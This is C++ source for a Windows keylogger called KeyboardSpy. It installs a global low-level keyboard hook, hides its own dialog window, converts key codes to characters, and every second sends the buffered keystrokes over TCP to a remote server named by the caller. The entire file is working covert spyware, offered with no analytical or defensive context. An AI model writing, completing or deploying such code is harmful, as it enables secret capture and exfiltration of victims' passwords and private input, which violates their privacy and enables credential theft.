#include "keyboardspy.h"
#include "resource.h"

static CRITICAL_SECTION gCs;
static KeyboardSpy gSpy;
static HWND hWnd = NULL;
static HHOOK gHHook = NULL;
static std::vector<TcpSocket*> gSockets;
static std::vector<char> gBuffer;

KeyboardSpy::KeyboardSpy()
{
    InitializeCriticalSection(&gCs);

    createDialogByNewThread();
}

KeyboardSpy::~KeyboardSpy()
{
    if(hWnd) {
        KillTimer(hWnd, 0);

        const int max = gSockets.size();
        for (int i=0; i<max; ++i) {
            gSockets.at(i)->dissconnect();
            delete gSockets.at(i);
        }

        DestroyWindow(hWnd);

        if (gHHook) {
            uninstallKeyboardHook(gHHook);
        }
    }

    DeleteCriticalSection(&gCs);
}

void KeyboardSpy::startKeyboardSpy(std::string domain, int port)
{
    TcpSocket *sock = new TcpSocket();
    if (!sock->connectTo(domain, port)) {
        delete sock;

        std::cout << "Failed to connect server for keyboard spy" << std::endl;	
        return;
    }

    std::cout << "Started keyboard spy" << std::endl;

    addSocket(sock);

    std::cout << "Started keyboard spy success" << std::endl;
}

void KeyboardSpy::createDialogByNewThread()
{
     HANDLE h = CreateThread(NULL,0,KeyboardSpy::threadProc,(LPVOID)NULL,0,NULL);
     if (!h) {
         std::cout << "Failed to create new thread" << std::endl;
     }
}

DWORD KeyboardSpy::threadProc(LPVOID)
{
	int ret = DialogBox(NULL,MAKEINTRESOURCE(IDD_KBSPY),NULL,keyboardSpyWndProc);
    if (ret == -1) {
        std::cout << "Failed to create dialog box for keyboard spy" << std::endl;
    }

    return true;
}

BOOL KeyboardSpy::keyboardSpyWndProc(HWND hWnd, UINT uiMsg, WPARAM , LPARAM )
{
    switch(uiMsg) {
    case WM_INITDIALOG: {
        const int time = 1000;
        SetTimer(hWnd,0, time, sendKeyboardData);

        gHHook = installKeyboardHook();
        if (!gHHook) {
            std::cout << "Failed to install keyboard hook" << std::endl;
        }	

        break;
    }
    case WM_PAINT:
        ShowWindow(hWnd,SW_HIDE);
        break;
    default:
        break;
    }

    return false;
}

HHOOK KeyboardSpy::installKeyboardHook()
{
    return SetWindowsHookExA(13, keyboardHookProc, GetModuleHandleA(NULL), 0);
}

void KeyboardSpy::uninstallKeyboardHook(HHOOK hHook)
{
    UnhookWindowsHookEx(hHook);
}

LRESULT KeyboardSpy::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN) {
        HookStruct *hs = (HookStruct *)lParam;
        char data = hs->iCode;

        bool isCapital = GetKeyState(VK_CAPITAL);
        if (hs->iCode >= 'A' && hs->iCode <= 'Z' && !isCapital) {
            data = data + 0x20;
        } else if (hs->iCode >= 0x60 && hs->iCode<= 0x69) {
            data = data - 0x30;
        } else {
            switch (hs->iCode) {
            case 106: data = '*'; break;
            case 107: data = '+'; break;
            case 109: data = '-';   break;
            case 110: data = '.'; break;
            case 111: data = '/'; break;
            case 186: data = ';'; break;
            case 187: data = '='; break;
            case 188: data = ','; break;
            case 189: data = '-'; break;
             case 190: data = '.'; break;
            case 191: data = '/'; break;
            case 192: data = '`'; break;
            case 219: data = '['; break;
            case 220: data = '\\'; break;
            case 221: data = ']'; break;
            case 222: data = '\''; break;
            }
        }

        addBuffer(data);
    }

    return CallNextHookEx(gHHook,nCode,wParam,lParam);
}

void KeyboardSpy::addSocket(TcpSocket *sock)
{
    EnterCriticalSection(&gCs);

    gSockets.push_back(sock);

    LeaveCriticalSection(&gCs);
}

std::vector<TcpSocket *> KeyboardSpy::getSockets()
{
    EnterCriticalSection(&gCs);

    std::vector<TcpSocket *> sockets = gSockets;

    LeaveCriticalSection(&gCs);

    return sockets;
}

void KeyboardSpy::delSocket(TcpSocket *sock)
{
    EnterCriticalSection(&gCs);

    std::vector<TcpSocket*>::iterator iter = gSockets.begin();
    for (; iter!=gSockets.end(); ++iter) {
        if (*iter == sock) {
            gSockets.erase(iter);
            break;
        }
    }

    LeaveCriticalSection(&gCs);
}

void KeyboardSpy::addBuffer(char data)
{
    gBuffer.push_back(data);
}

void KeyboardSpy::delBuffer()
{
    gBuffer.clear();
}

void KeyboardSpy::sendKeyboardData(HWND , UINT , UINT , DWORD )
{
    if (gBuffer.size() > 0) {
        std::vector<TcpSocket*> sockets = getSockets();
        int max = sockets.size();
        for (int i = 0; i<max; ++i) {
            TcpSocket *sock = sockets.at(i);

            if (!sock->sendData(&gBuffer[0], gBuffer.size())) {
                delSocket(sock);

                delete sock;

                std::cout << "Finished keyboard spy" << std::endl;
            }
        }

        delBuffer();
    }
}


